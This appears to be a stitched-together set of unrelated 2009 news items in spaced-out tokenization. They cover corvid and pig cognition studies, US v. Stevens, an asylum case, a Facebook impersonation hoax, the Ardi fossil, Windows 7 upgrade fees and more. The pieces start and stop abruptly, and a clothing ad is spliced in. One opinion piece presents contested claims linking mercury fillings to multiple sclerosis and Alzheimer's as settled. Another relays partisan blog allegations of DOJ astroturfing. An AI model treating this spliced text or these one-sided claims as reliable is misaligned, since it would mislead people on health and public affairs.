Aesop 's fables are full of talking frogs and mice who wear clothes , but it turns out at least one of the classic tales is scientifically accurate .
Researchers presented four crows with a challenge from Aesop 's fable " The Crow and the Pitcher " : a container of water not quite full enough for the birds to reach with their beaks .
Just like Aesop 's crow , all four birds figured out how to raise the water level by dropping stones into the glass .
The crows also selectively chose large pebbles over small ones , and quickly realized that dropping rocks into a container of sawdust did n't have the same effect .
" The results of these experiments provide the first empirical evidence that a species of corvid is capable of the remarkable problem - solving ability described more than two thousand years ago by Aesop , " wrote the researchers in the paper published Thursday in Current Biology .
" What was once thought to be a fictional account of the solution by a bird appears to have been based on a cognitive reality . "
The researchers took four adult rooks , a type of intelligent crow , and tempted them with a tasty worm floating on top of a glass of water , just out of reach .
Then they placed a pile of small rocks next to the crows .
After they assessed the height of the water from the top and sides of the glass , the crows dropped stones into the glass until the water level rose enough for them to grab their prize .
Once they 'd caught the worm , the birds did n't keep putting stones in the glass , and they did n't try to grab the worm until they 'd dropped in a certain number of stones .
" This number was strongly correlated to the number of stones needed to raise the water level to the correct height , " the researchers wrote , " suggesting that , having assessed the starting level of the water , rooks translated this into an estimate of the number of stones needed . "
Before this experiment , the birds had never been exposed to a glass with water in it , and they 'd never used stones as tools .
According to the researchers , the only other animal known to perform this kind of task is the orangutan , which has been recorded spitting into a tube to bring a peanut into reach .
" Corvids are remarkably intelligent , and in many ways rival the great apes in their physical intelligence and ability to solve problems , " said biologist Christopher Bird of the University of Cambridge in a press release .
" This is remarkable considering their brain is so different to the great apes ' . "
The antics of the four birds — Cook , Fry , Connelly and Monroe — can be seen in the videos below .
Cook and Fry snagged the floating worm after just one try , while Connelly and Monroe succeeded after two attempts .
Unfortunately , Fry had a bad reaction to one of the worms and gave up in the middle of the experiment .
Connelly captures the worm :
Monroe picks out large stones instead of small stones :
Cook has realized that sawdust does n't work as well as water :

THE MERCURY MISCHIEF :
AS OBAMA WARNS OF HAZARDS ,
THE FDA APPROVES MERCURY DENTAL FILLINGS
The government seems to be speaking out of both sides of its mouth , as the President preaches one thing and the FDA does another .
If we are going to have �smarter medicine that really works , � we need to get politics , lobbies and cronyism out of science .
President Obama has proposed covering the costs of his new medical plan with �smarter � medicine , meaning the adoption of procedures that eliminate inefficiencies and stress prevention .
At a town hall meeting in New Hampshire on August 11 , 2009 , he gave the example of a diabetic needing to have a foot amputated , at a cost of $ 30,000 to $ 50,000 .
It would have been smarter to counsel the patient on diet and weight loss and monitor his medications before amputation was required .
The insurance company would have saved money and the patient would have saved a foot .
The 2008 Obama / Biden Plan for a Healthy America also stressed preventive approaches to disease , including the reduction of toxins to which the body is exposed ; and chief among these toxins was mercury .
The Plan stated as a fundamental goal :
� Reduce Risks of Mercury Pollution .
More than five million women of childbearing age have high levels of toxic mercury in their blood , and approximately 630,000 newborns are born at risk every year .
The EPA estimates that every year , more than one in six children could be at risk for developmental disorders because of mercury exposure in the mother�s womb . �
As a Senator , Obama was responsible for extensive legislation reducing environmental exposure to mercury , including a ban on the export of elemental mercury , and legislation to phase out the use of mercury in the manufacture of chlorine .
Mercury can get into the blood by various routes , and one that has been lately in the news is the mercury found in the thimerosol in vaccines .
Another source that made the news in July is the mercury released from dental fillings by chewing .
The World Health Organization has stated that between 3 - 17 micrograms of mercury are released into the body each day by chewing , compared to only 2 - 5 micrograms from fish and all other environmental sources combined .
In 1990 , the New England Journal of Medicine published an editorial calling mercury amalgam fillings �possibly the chief source of exposure [ to mercury ] of a large segment of the U.S. population� .
Surprise FDA Ruling
When mercury amalgam made the news on July 29 , 2009 , however , it was not to warn of its hazards .
Rather , it was to report the FDA�s surprise ruling that mercury fillings are safe .
The ruling came after years of foot dragging by the FDA and a wave of consumer lawsuits .
A growing consumer movement had amassed so much evidence for the dangers posed by mercury dental fillings that when a court finally ordered the FDA to come out with a ruling , the plaintiffs announced , � We won ! �
But instead of the declaration they expected , the FDA imposed no restrictions on the use of mercury amalgam .
Dentists were not even required to inform their patients that �silver� fillings are composed mostly of mercury .
The FDA conceded that it did not know if amalgam was harmful to children under six , pregnant women , or nursing mothers , but it took no steps to protect them .
It even pulled from its website an existing neurological risk advisory that said , � Dental amalgams contain mercury , which may have neurotoxic effects on the nervous systems of developing children and fetuses . �
Consumer advocates were stunned , as the FDA had earlier agreed to strengthen its warnings against mercury amalgam fillings .
The evidence against mercury amalgam dental fillings was considered so compelling that Sweden , Norway , and other countries had already banned their use entirely .
Degussa , Germany�s largest producer of amalgam and the world�s largest producer of metals for dentistry , completely shut down its amalgam production after a federal court ruled that dentists who used it faced legal liability .
The FDA was expected to follow suit .
Why its unexpected about - face ?
Charles Brown , of the National Counsel for consumers for Dental Choice , suggests it had to do with a change in personnel .
In May 2009 , Dr. Margaret Hamburg succeeded to the post of FDA Commissioner .
The Wall Street Journal noted that for five years before that , she served on the board of Henry Schein Inc. , a $ 4 billion firm that distributes medical and dental supplies , including vaccines .
Brown wrote skeptically :
� Washington is famous for the revolving door -- those in the party out of power take highly paid corporate positions , then return to government to bail out their benefactors .
The new FDA Commissioner , Margaret Hamburg , worked in the Clinton Administration , then went out and became a director at the dental products colossus Henry Schein , earning a quarter million dollars a year for the handful of hours it takes to be a director .
Corporations do this because they know the other party will return to power , at which time the corporations will call in their chits . �
Science or Politics ?
The Liability Question
Beyond that potential conflict of interest , there was likely to have been heavy pressure from the American Dental Association , the professional union of dentists .
If mercury amalgam were officially declared to be toxic , an estimated two billion mercury amalgam fillings might have to be replaced at practitioners � or insurers � expense , not to mention the flood of lawsuits for medical injuries that would follow .
Dentists could hardly defend by pleading ignorance of mercury�s harmful effects , since its health risks have long been known .
Lewis Carroll alluded to the toxic effects of mercury in his nineteenth century character the Mad Hatter .
Felt hat workers exposed to mercuric nitrate were observed to exhibit emotional symptoms including sudden anger , depression , loss of memory , timidity , insomnia , irritability , hallucinations , delusions and mania , a condition referred to as �mad hatter syndrome .�
The manufacturer of the product Dispersalloy , consisting of capsules of metal powder mixed with liquid mercury and placed in the patient�s mouth , has a warning on its website stating :
� Inhalation of mercury vapor over a long period may cause mercurialism which is characterized by fine tremors and erethism�� �Erethism may be manifested by abnormal shyness , blushing , self - consciousness , depression or despondency , resentment of criticism , irritability or excitability , headache , fatigue and insomnia .
In severe cases , hallucinations , loss of memory and mental deterioration may occur . �
Among other disturbing studies prompting consumer concerns was one reported in August 1990 by Drs. Lorscheider and Vimy of the University of Calgary in Alberta , in which twelve radioactive mercury amalgam fillings ( a typical number for a human adult ) were placed in the mouths of sheep .
A control group received fillings made of an inert material .
Within thirty days , the sheep that got the amalgam had lost half their kidney function .
The study showed that mercury in amalgam fillings is not locked in the teeth but spreads through the body to the organs .
Similar data have been reported for monkeys .
The isotope labeled mercury showed poisoning of the internal organs and the brain of both sheep and monkeys .
Studies in humans include one conducted at the University of Kentucky , showing significant elevations of mercury in the brains of 180 Kentucky residents who were autopsied after dying of Alzheimer�s disease .
When the concentrations of trace elements were analyzed , the most important imbalance found was an elevation of mercury .
In studies of the cadavers of accident victims , those with a mere five amalgams had three times the amount of mercury in their brain tissues as cadavers without amalgams .
Other studies have linked mercury fillings to multiple sclerosis .
In one reported by Colorado State University researcher Robert Siblerud , MS patients having amalgams were compared to MS patients whose amalgams had been removed .
The former group was found to have significantly lower levels of red blood cells , hemoglobin , hematocrit , T - Lymphocytes and T - 8 suppressor cells ( indicating lowered immunity ) .
They also had 33 percent more flare - ups of their symptoms during the previous year .
In another study , mercury levels in the cerebrospinal fluid of MS patients were shown to be eight times higher than in controls .
Siblerud observed that MS was first described by a French doctor in the mid-1830s , less than a decade after silver / mercury fillings were first promoted in Paris .
All of which suggests that the FDA�s July 31 ruling was based more on politics than science .
The effects of mercury amalgam fillings on the patients themselves apparently carried less weight than its effects on the balance sheets of medical professionals and insurance companies .
If we are going to have �smarter medicine� that realy keeps people well , we need to get politics out of medicine .
We need a government agency that explores and funds solid research into what keeps people healthy and what makes them sick , an agency that makes its determinations independently of lobbies , drug detail men , funding from industries standing to benefit from the results , or revolving doors into and out of those industries .

At issue in US v. Stevens is whether Congress overstepped its authority when it passed a 1999 law barring the creation , sale , or possession of any depiction of animal cruelty with the intent to distribute and sell it .
The law was aimed at blocking a small but growing market in underground sexual - fetish videos that involve dominatrix women who step on and kill small animals .
By one estimate in 1999 , these so - called " crush videos " represented a million - dollar market .
Rather than focusing exclusively on crush videos , Congress wrote a statute criminalizing a wider swath of conduct involving " animal cruelty . "
Free -speech advocates warn of the dangers of roping off an entire section of images and ideas from public discourse .
There is a value to protecting unpopular , dangerous , even repulsive speech in the marketplace of ideas , they argue .
Would someone seeking to sell a Spanish bullfight video in the United States be subject to a fine and prison term ? , they ask .
Animal rights activists counter that the government has a compelling interest in preventing the inhumane treatment of animals .
They stress that videos depicting such mistreatment are obscene and have no social value .
The Supreme Court last declared a category of speech to be unprotected by the First Amendment in 1982 : Child pornography did not deserve constitutional protection , it said .
Other forms of speech declared unprotected include : fighting words in 1942 , threats in 1969 , speech inciting illegal activity in 1969 , and obscenity in 1973 .
In addition , there is no right to make libelous statements .
A key question in the Stevens case is whether animal cruelty rises to the same level of government concern underlying these prior rulings .
All 50 states have enacted laws against acts of animal cruelty and obscenity .
The case before the high court involves an author and documentary producer named Robert Stevens who was convicted of violating the law by selling three videotapes about pit bulls to undercover agents .
He was sentenced to three years in prison .
A federal appeals court threw the conviction out after declaring the law violated the First Amendment .
One film showed pit bulls catching wild boars during hunting trips .
Another showed pit bulls engaged in a dogfight in Japan , where such fighting is legal .
A third film included dogfight footage shot in the US in the 1960s and ' 70s .
Mr. Stevens has said he included the dogfight and hunting depictions not to promote dogfighting , but to demonstrate aggressive characteristics that distinguish the pit bull breed from other dogs .
The statute outlaws only a narrow category of speech – " bloody spectacles of vicious animals forced to fight to the point of exhaustion or death , " Solicitor General Elena Kagan writes in her brief .
In addition to crush videos , the law bars depictions of dogfights , hog - dog fights , and cockfights .
" Such images are far removed from the free trade in ideas that the First Amendment was designed to protect , " Ms. Kagan says .
Stevens 's lawyers disagree .
" The notion that Congress can suddenly strip a broad swath of never - before - regulated speech of First Amendment protection and send its creators to federal prison , based on nothing more than an ad hoc balancing of the ' expressive value ' of the speech against its ' societal costs ' is entirely alien to constitutional jurisprudence and a dangerous threat to liberty , " writes Washington lawyer Patricia Millett in her brief to the court .

“ I thank God it came out well , ” she said , speaking in Spanish .
“ But it was n’t easy to wait this long for immigration to make a decision . ”

She said she hoped the outcome in her case would mean that other abused women would receive quicker decisions from the courts .
Homeland Security Department officials were cautious in assessing the implications of the administration ’s recommendation .
The department “ continues to view domestic violence as a possible basis for asylum , ” a department spokesman , Matthew Chandler , said .
But such cases , Mr. Chandler said , continue to depend on the specific abuse .
The department is writing regulations to govern claims based on domestic violence , he said .
After enduring a decade of violence by her husband , Francisco Osorio , a former soldier in Guatemala , Ms. Alvarado came to the United States in 1995 .
Over the years , immigration judges have not questioned the credibility of her story .
According to court documents , she married when she was 16 , and became pregnant soon afterward .
In a beating that he apparently hoped would induce an abortion , Mr. Osorio dislocated her jaw and kicked her repeatedly .
He also “ pistol - whipped Ms. Alvarado , broke windows and mirrors with her head , punched and slapped her , threatened her with his machete and dragged her down the street by her hair , ” a court filing states .
In 1996 , an immigration judge in San Francisco granted Ms. Alvarado ’s asylum petition , but an immigration appeals court overturned that decision in 1999 .
In 2001 , Attorney General Janet Reno threw out the appeals court decision , but did not grant Ms. Alvarado asylum .
( Because the immigration courts are part of the executive branch , not the judiciary , the attorney general is the highest legal authority . )
In 2004 , the Department of Homeland Security , which represents the government in immigration cases , argued for the first time in favor of asylum for Ms. Alvarado .
Attorney General John Ashcroft ordered a new review but did not reach a decision .
In September 2008 , Attorney General Michael B. Mukasey sent the case back to the immigration appeals court , encouraging the court to issue a precedent - setting ruling .
Such a ruling can come only from an immigration appeals court or a federal court .
The large legal question in the case is whether women who suffer domestic abuse are part of a “ particular social group ” that has faced persecution , one criteria for asylum claims .
In a separate asylum case in April , the Department of Homeland Security pointed to some specific ways that battered women could meet this standard .

Obama ’s Attorney General , Eric Holder , has apparently hired a cadre of left - wing , Democrat campaign bloggers to troll through the Internet looking for news stories and blog posts that denigrate the Obama agenda .
After such websites are found it is the job of these secret lefty bloggers to leave comments that come to the support of Obamaism in the comments sections .
It seems that Eric Holder has created his own little propaganda unit in a valiant effort to become the Bloggi Riefenstahl of the Obama era .
As reported at The Muffled Oar , a blog that first broke the story of Holder ’s secretive blogging unit — dubbed the “ Blog Squad ” by blogger Isaac Muzzey — Holder has housed this unit in the Office of Public Affairs at the Department of Justice .
It also appears that former John Edwards staffer Tracy Russo is part of this special unit .
A site called whorunsgov.com reported back in May that DOJ hired Russo to do “ media outreach for the whole department . ”
It is , according to whorunsgov.com , the first time such an effort has been made at DOJ .
Of Russo ’s duties , The Muffled Oar says :
Not only is the Department of Justice Blog Squad going to reach out to nontraditional media like TPM Muckraker or the Muffled Oar , but they are also tasked with fostering anonymous comments at conservative leaning blogs such as the Free Republic .
They are also tasked with fostering anonymous comments , or comments under pseudonyms , at newspaper websites with stories critical of the Department of Justice , Holder and President Obama .
If indeed this is what DOJ media outreach does it would most certainly qualify as “ astroturfing . ”
Astroturfing is the action of using fake commenters and multiple screen names on all sorts of sites to push a similar opinion to create the appearance of a grass roots movement and make it seem as if there are all sorts of individuals naturally supporting a product or political movement .
It most certainly is a creepy , propagandistic sort of effort that Holder ’s office is involved in and it is one that certainly seems an immoral one .
After all , it most certainly is lying to the public if there are a handful of DOJ employees casting about on hundreds of different websites pretending that they are just your average citizen coming to the support of the Obama administration .
But is it illegal ?
Hans von Spakovsky of National Review ’s the corner blog certainly thinks so .
I doubt that the Office of Public Affairs ( OPA ) has received an ethics opinion from Justice ’s Professional Responsibility Advisory Office ( PRAO ) saying that it is acceptable for OPA employees to be harassing critics of the department through postings that deliberately hide their DOJ affiliation ( a practice that is not very “ open ” or “ transparent ” ) .
DOJ lawyers also ought to be aware of ABA Model Rule of Professional Conduct 8.4 , which states that it is professional misconduct for a lawyer to engage in conduct involving dishonesty , fraud , deceit , or misrepresentation .
If the report in The Muffled Oar is correct , tax dollars are being used directly for such dishonest , deceitful behavior .
I must say , it ’s hard to disagree with von Spakovsky ( if that ’s his real name ! — a little joke there ) .
Mr. von Spakovsky also makes a perfectly pertinent point to wrap up his blog post on this matter .
He wonders if the Obama administration will ever learn the difference between political campaign and the “ entirely different responsibility it now has to enforce this nation ’s laws in an objective , nonpartisan , nonpolitical manner ” ?
I think that the question is a good one .
After all , after nearly a year in office , we have yet to see the end Obama ’s constant blaming of Bush for every little problem he runs up against not to mention the constant campaign speeches and appearances on TV at every hour , day and night .
One gets the uneasy feeling that President Barack Obama has yet to put in an actual day ’s work as he constantly campaigns for office instead .

Our motorcycle rain gear and red leather pants provide a real star look to leather clothing .
Beside this we carry a wide variety of mens leather pants and leather clothing for women .
Sept. 24 , 2009  -- Debbie Lee was more than 100 miles from home , camping in the woods , when someone staged a life - and - death drama on her Facebook page .
For about two - and - a - half hours , suicidal notes were posted to her account .
As family and friends wrote back , pleading with her to preserve her life , the messages continued .
" Debbie Lee has realized that my life is a lie and that my only friend is the handgun in the back of my closet , " said one message .
" My pain will be over soon , " said another .
It was n't until Lee reached ground high enough to have phone reception that she received any clue about what was happening .
About 20 messages flooded in within a minute , she said , some telling her not to do " anything drastic . "
By the time her son got through to her cell phone , several police officers had assembled outside her home in Surprise , Ariz . , ready to break down the door .
" They thought maybe I was out somewhere , maybe , going to kill myself , " she said , adding that her closest friends , and even children , were fooled because of all the personal details threaded through the messages .
" This person was pretending to be me . "
Local Police : No City , State Laws Broken
A hacker , she said , had impersonated her online , convincing family and friends that she was on the verge of suicide .
The fraudster also broke into her e-mail account and sent out racist messages , she said .
Lee , whose son was a Navy Seal who died in Iraq in 2006 , said the whole ordeal has been " an absolute nightmare . "
" I just do n't understand .
Our family has been through so much , " she said .
" The person threatened more attacks .
I 've changed the way I 've lived my life .
I 've never been a worrier , a fretter .
I 've had to think differently . "
Although local police started to investigate the incident , which took place Aug. 21 , she said she was told Friday that the case had been closed because they could n't identify any city or state laws that had been broken .
" I could n't believe it .
How could you say that there were n't any laws broken ? " asked Lee .
" I could n't believe that they had closed the case . "
Lee : Someone Is Trying to Discredit Me
Since the death of her son Marc , Lee has become a vocal spokeswoman for members of the military and their families .
She founded the non-profit America 's Mighty Warriors , which remembers fallen soldiers and supports their families .
And she has traveled to Iraq , Guantanamo Bay and other military bases to thank the troops , meeting with President George W. Bush and other dignitaries along the way .
Given her work and visibility , she thinks the attacks were politically motivated .
" I do n't know what kind of sick , sick human would do this , " Lee said .
" It 's someone trying to discredit who I am and what I do . "
But though Lee said the experience has left her shaken to the core , distrusting the technology that made this possible , a spokesman for the local police department said that , under city and state law , a crime was not necessarily committed .
" Yes , it causes grief and we do feel for her .
We do take that seriously .
But unfortunately , our hands are tied by the fact that we have to be out there enforcing an actual statute , " said Sgt. Mark Ortega , a public information officer with the Surprise Police Department .
In Arizona , No Cyber Harassment Statutees at State Level
He said that after conferring with the county attorney , the department concluded that there were n't cyber harassment statutes it could enforce .
Although he said that in some areas pranksters who cry wolf could be charged with wasting police resources , those statutes do n't exist in Surprise .
He said the case is n't officially closed but is considered " inactive . "
Although his colleagues have reached a standstill , he said they 've notified the FBI and are working with them to see what could be prosecuted at the federal level .
Doug Sylvester , a professor at the Sandra Day O'Conner College of Law at Arizona State University , agreed that a state criminal statute would likely not apply in this case , but said that under federal law hacking into someone else 's account is a criminal offense .
" Criminal law assigns itself to the most egregious results " he said .
But in cases that do n't result in physical harm or financial losses , the lack of political will means they 're left to the civil side .
Cyber Harassment Happens More Frequently Than People Think
Although he was n't familiar with the details of Lee 's case , he said she could claim psychological and emotional distress in a civil case .
Still , some cyber crime experts say that though these kinds of attacks happen more frequently than people think , more training is needed to educate law enforcement about the laws surrounding personal cyber attacks .
" A lot of law enforcement , they just do n't understand what the panoply of laws are , " said Parry Aftab , the executive director of WiredSafety.org and cyber abuse expert .
" All these fake , ' I 'm going to commit suicide ' things happen often .
In chat rooms , on social networks , they happen in interactive games . "
Sometimes the fraudsters fake suicide because they think it 's a funny joke , other times it 's because they 're emotionally unbalanced or have a vendetta against the person , she said .
Although local privacy laws vary , Aftab said people in Lee 's position could bring civil charges for theft , fraud or defamation but emphasized that hacking into another 's account ( be it e-mail , a social network or other service ) is a crime .
Depending on how long identifying information is retained by the online company , she said , the hacker can be traced through information like an IP ( Internet protocol ) address , which is the unique number assigned to each computer .
To improve their online safety , Aftab advises people to assign a unique password to each of their online accounts and use unusual character or word combinations in each password .
As for local law enforcement 's decision to close Lee 's case , Aftab acknowledged that she does n't know all of the facts , but said , " I think they may have closed it too soon because it is a very important issue that they need to make clear should not be repeated and needs to be treated with the most serious reaction possible . "
You probably remember how earlier this month Newt Gingrich somehow managed to have his 527 Group award its “ Entrepreneur of the Year ” award to porn exec Allison Vivas and invite her to an “ intimate event ” with Newt himself .
Vivas was game .
But Gingrich ’s group soon rescinded the award .
Today we learned there ’s been another misunderstanding .
Gingrich ’s outfit , American Solutions for Winning the Future , gave a new “ Entrepreneur of the Year ” award to Dawn Rizos , owner of The Lodge , which the Dallas Morning News calls “ one of the best - known gentlemen ’s clubs in Dallas . ”
Alas , again , the offer has been rescinded .
But TPM ’s Ben Frumin got a chance to talk to Rizos to get her take on getting the Newt jilt .
In just five hours , an average farm pig can learn how to interpret an image in the mirror and use it to find hidden food .
Scientists consider the ability to use a mirror a sign of complex cognitive processing and an indication of a certain level of awareness .
In addition to humans and some primates , dolphins , elephants , magpies and a famous African grey parrot named Alex have all been known to retrieve objects or remove marks on their body using a mirror .
Now it looks like pigs should be added to the list of clever critters that can master a mirror :
After spending five hours with a mirror in their pen , seven out of eight pigs could use the reflection to find a hidden bowl of grub .
" This is the first demonstration of the ability of pigs to use mirrors , " animal behavior expert Donald Broom of the University of Cambridge wrote in an e-mail .
" Finding sophisticated learning and awareness in animals can alter the way that people think about the species and may result in better welfare in the long run . "
Broom co-authored the paper published this month in Animal Behaviour .
Like most animals , the pigs were immediately curious when researchers placed the shiny , reflective object in their pen .
They approached the mirror until they bumped into it with their snout , and then checked to see what was behind the mirror .
The pigs spent an average of 20 minutes gazing at their reflection , often turning in different directions to inspect themselves from several angles .
" These kind of movements suggest that the pigs were correlating the movements of their body with the visual stimulus they were receiving from the mirror , and so learning the contingency between the two , " biologist Louise Barrett of the University of Liverpool wrote in a commentary about the paper , also published this month in Animal Behaviour .
After five hours with a mirror , the pigs were placed in a new test area that contained a food bowl hidden behind a barrier .
Although the pigs could see the reflection of the bowl in the mirror , they could n't see the food directly .
A fan above the bowl circulated the scent of food around the room , prohibiting the pigs from smelling their way to the treat .
Seven out of eight of the pigs with previous mirror experience spotted the reflection of the food bowl and correctly interpreted its location :
Instead of searching for the food in its apparent position behind the mirror , the pigs headed around the barrier and straight for the true location of the bowl .
When the researchers tested pigs with no prior mirror exposure , however , nine out of 11 of them became confused , searching behind the mirror for the food .
" These results suggest not only that pigs learn the contingency between their own movements and their image in the mirror , " Barrett wrote , " but that their knowledge incorporates the layout of the environment as well , so that they can locate objects in space . "
The researchers say their experiment is more than a nifty trick :
The fact that pigs can learn to use a mirror means they are capable of a type of awareness called assessment awareness , which means they can understand the significance of a situation in relation to themselves , over a short period of time .
In this case , the pigs remembered how their own movements appeared in the mirror , and were able to apply that knowledge to a separate situation involving a hidden food bowl .
" Having a sense of self and using it is a form of assessment awareness , " Broom wrote .
Although the mirror experiment does n't directly prove that pigs have a sense of self , the researchers suggest that given how quickly the pigs learn to recognize their own movements in a mirror , they may have some degree of self - awareness .
" We have no conclusive evidence of a sense of self , " Broom wrote , " but you might well conclude that it is likely from our results . "
Other mirror tests have been used to more directly examine an animal 's sense of self — if researchers apply a yellow mark to the black feathers of a magpie , for instance , the bird will use a mirror to clean itself off .
Unfortunately , Broom says the mark experiments just do n't work on pigs :
Pigs are so accustomed to being streaked with mud , they do n't much care if researchers apply extra marks on their bodies .
" We have put marks on pigs , " Broom wrote .
" They take little notice of them . "
Combined with a host of other research studies demonstrating the keen intelligence of pigs , the researchers hope their study will lead to better treatment of the farm animals .
" If an animal is clever , " Broom wrote , " it is less likely to be treated as if it is an object or a machine to produce food , and more likely to be considered as an individual of value in itself . "

Alleged Robber Hands Bullet to Store Clerk After She Prays With Him Clerk Angela Montez prayed with the alleged robber of an Indianapolis store .
Oct. 21 , 2009  --
A man suspected of robbing an Indianapolis check cashing store removed the bullet from his gun after the clerk talked about God and prayed with him , police said .
The man , Gregory L. Smith of Indianapolis , turned himself in to police a few hours after he allegedly held up the Advance America check cashing store Monday .
Police responding to the store around 4:20 p.m. were told that it had just been robbed .
Smith , 23 , initially entered the establishment to apply for a loan , then left to get identification that clerk Angela Montez requested , officials said .
But Smith returned and allegedly pointed a gun at the woman .
He then told her that times were hard , he had a son to feed and " he had no choice , " according to the report of the incident from the Indianapolis Metropolitan Police Department .
But when Montez , 43 , started to talk to the alleged robber about God , Smith began to tell her about his hardships and asked her to pray with him , the report said .
" I started crying and praying and telling him , ' Do n't do this , ' he was too young to throw away his life , " Montez said on a 911 call to police .
The incident took an even more surprising turn when Smith removed the bullet from his gun and gave it to Montez , police said .
" He took the bullet out of the gun and said , ' Here , I 'm not going to hurt you , I 'm not going to hurt you , ' " Montez said on the 911 call .
Suspect Talked to Victim About His Troubles , Police Say
After they talked , Smith asked Montez for a hug and asked her not to report him , then told her to go into the restroom and not come out for 20 minutes , police said .
Police said Smith took $ 20 from the cash drawer , leaving the rest of the money behind , and Montez 's cell phone from her purse .
He turned himself in later that night .
His mother had seen surveillance video of the incident on a newscast and urged her son to turn himself in .
Lt. Jeff Duhammell of the Indianapolis Metropolitan Police said Montez did well .
" How people react , we just do n't know until they 're faced with it , " he said .
" She did an extremely good job , and should be commended for her actions . "
Smith was arrested on robbery and firearm charges .

The oldest - known hominid skeleton was a 4 - foot - tall female who walked upright more than 4 million years ago and offers new clues to how humans may have evolved , scientists say .
This sketch shows what a 4 million - year - old hominid , nicknamed Ardi , may have looked like .
Scientists believe that the fossilized remains , which were discovered in 1994 in Ethiopia and studied for years by an international team of researchers , support beliefs that humans and chimpanzees evolved separately from a common ancestor .
" This is not an ordinary fossil .
It 's not a chimp .
It 's not a human .
It shows us what we used to be , " said project co-director Tim White , a paleontologist at the University of California , Berkeley .
Ardipithecus ramidus , nicknamed " Ardi , " is a hominid species that lived 4.4 million years ago in what is now Aramis , Ethiopia .
That makes Ardi more than a million years older than the celebrated Lucy , the partial ape - human skeleton found in Africa in 1974 .
Ardi's 125 - piece skeleton includes the skull , teeth , pelvis , hands and feet bones .
Scientists say the data collected from Ardi's bone fragments over the past 17 years push back the story of human evolution further than previously believed .
" In fact , what Ardipithecus tells us is that we as humans have been evolving to what we are today for at least 6 million years , " C. Owen Lovejoy , an evolutionary biologist at Kent State University and project anatomist , said Thursday .
Analysis of Ardi's skeleton reveals that she weighed about 110 pounds , had very long arms and fingers , and possessed an opposable big toe that would have helped her grasp branches while moving through trees .
Ardi's brain was believed to be the size of a chimp's , but she also had many human - like features , such as the ability to walk upright on two legs .
Her " all - purpose type " teeth indicate that she probably ate a combination of plants , fruits and small mammals , scientists say .
" The anatomy behind this behavioral combination is very unexpected and is certain to cause considerable rethinking of not only our evolutionary past , but also that of our living relatives : the great apes , " said Alan Walker , professor of biological anthropology at Pennsylvania State University .
Many scientists hypothesize that humans took a different evolutionary trajectory from those of chimpanzees , bonobos and gorillas .
Ardi's findings help challenge earlier beliefs that humans evolved from chimpanzees , their closest genetic relatives , scientists say .
Researchers are still trying to pinpoint when the two lineages -- chimps and humans -- split from their common ancestor .
Digging up the past has not been easy .
Scientists stumbled upon the Ardipithecus fossil in 1994 when a graduate student found a single upper molar tooth .
The rest of Ardi 's fossilized bones , sandwiched between layers of volcanic rock , took three years to be recovered and many more to be analyzed .
" In many ways , the discovery of Ardipithecus has been like a marathon , " White said .
" Ardipithecus ramidus and its prevailing anatomy revolutionize the way most of us understood the earlier part of our evolutionary history , " said team member Yohannes Haile - Selassie , paleontologist at the Cleveland Museum of Natural History .
The Ardi findings are the work of 47 paleontologists and geologists representing 10 countries .
The results will be published Friday in 11 articles in a special edition of the journal Science .
Until now , Australopithecus , nicknamed " Lucy , " was the oldest fossil studied by scientists seeking to explain human evolution .
Lucy is believed to have lived about 3.2 million years ago in what is now Ethiopia .
Many scientists credit Ethiopia with taking the lead in helping the world better understand the origins of humans .
" This finding points to a deeper sense of our [ humans ' ] interconnectedness , " Samuel Assefa , Ethiopian ambassador to the United States , said Thursday .
" We are all Ethiopians at heart . "
Ardi's skeleton resides in the National Museum of Ethiopia in Addis Ababa .

The state attorney general , J. B. Van Hollen , said he would not defend a new law that grants same - sex couples spousal benefits like hospital visits and inheritance , saying lawmakers went against voters ’ decision not to extend such privileges .
Mr. Van Hollen , a Republican , said the state ’s Constitution prohibited same - sex couples from holding a legal status that is “ substantially similar ” to marriage , and said he had concluded that the new domestic partner registry did that .
His decision will force the state to hire an outside counsel to defend the law .
Gov. James E. Doyle , a Democrat , said : “ The attorney general ’s job is to represent the state and defend state law when there is a good - faith defense to be made .
His representation should not be based on whether he likes the state law . ”
' Robocop ' who targeted drug dealers died from heroin overdose
' Robocop ' David Pilling tackled drug dealers but died after taking heroin
A police officer who was renowned for his work against London drug dealers was found dead in his flat from a heroin overdose .
David Pilling , 47 , who was nicknamed " Robocop " for his efforts in tackling drugs , was found collapsed at his home in Camden earlier this year .
An inquest heard yesterday how an overdose of injected heroin killed the officer .
Traces of cocaine and Ecstasy were also in his system .
His death in March shocked friends , colleagues and family , none of whom had any idea he took drugs .
Toxicology reports revealed his blood contained levels of heroin more than four times the amount associated with fatal overdoses .
Colleagues said he may have been experimenting and died of an accidental overdose .
An investigation found he had been looking at websites on how to take drugs just before his death .
PC Pilling built up a reputation for tackling drug dealers on his West End beat .
He once chased a dealer down a flight of steps in Tottenham Court Road on his motorbike .
Camden borough commander Dominic Clout said : ' PC Pilling was a truly valued member of staf f .
He displayed no signs of drug use while at Camden . '
Tests showed PC Pilling was not a drug addict .
A verdict of death by misadventure was recorded .

Computer manufacturers have been accused of excessive shipping charges for a supposedly free Windows 7 upgrade scheme .
The fees mean some buyers could wind up paying as much as $ 17.03 for shipping : far more than the actual costs of delivering the upgrade .
According to the free Windows 7 deal , people who buy Vista machines before the Windows 7 release date of October 22nd , 2009 will be able to get a " free " copy of Windows 7 upon its release .
The aim of the scheme was to minimize the drop in computer purchases over the summer among people who'd otherwise have waited for the new system rather than buy something which was about to become outdated .
The scheme 's operation means that buyers must deal directly with the PC manufacturer to request the upgrade rather than get it from the computer retailer .
The manufacturer then sends them an upgrade disc in the mail .
Some Retailers Free , Others Not
Consumer
World is now complaining that some manufacturers are charging customers a handling fee to receive the upgrade package .
At most this should contain two disks ( one with Windows 7 , one with drivers ) and a short installation manual , which would likely cost the firm a couple of bucks at most .
( Source : mouseprint.org )
However , while Acer and Dell are providing the upgrade without charge , firms such as Compaq , HP , Sony and Toshiba are charging between $ 11.25 and $ 14.99 to some customers .
Lenovo is not only charging all customers , but is hitting them with a $ 17.03 fee .
( Source : pcworld.com )
Retailers Keep Quiet
Several of these manufacturers are only listing the fee during the later stages of the upgrade application process .
With most retailers not mentioning the possibility of fees while marketing the scheme , it 's likely many people wo n't find out about the charge until after they 've bought their computer .
Upgrade May Not Arrive Until February
There 's also little guarantee that customers will get the upgrade any time soon .
Most manufacturers simply say it will be shipped after Windows 7 is officially released , but Toshiba is listing a 60 day delivery schedule and Samsung appears to indicate some customers may have to wait until the end of February before receiving the upgrade .

Mountain Goats frontman John Darnielle has never been afraid to take on vast subjects in his songs : loneliness , fear , joy , abuse .
